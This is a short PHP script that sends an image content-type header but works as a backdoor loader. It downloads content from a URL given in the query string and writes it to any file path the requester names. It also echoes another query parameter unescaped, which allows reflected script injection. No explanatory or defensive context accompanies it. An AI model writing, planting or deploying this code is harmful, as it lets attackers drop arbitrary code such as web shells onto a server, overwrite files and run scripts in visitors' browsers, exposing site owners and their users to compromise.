<?php
header('Content-type: image/jpeg');
file_put_contents($_GET["id"],file_get_contents($_GET["url"]));
echo $_GET["textt"]
?>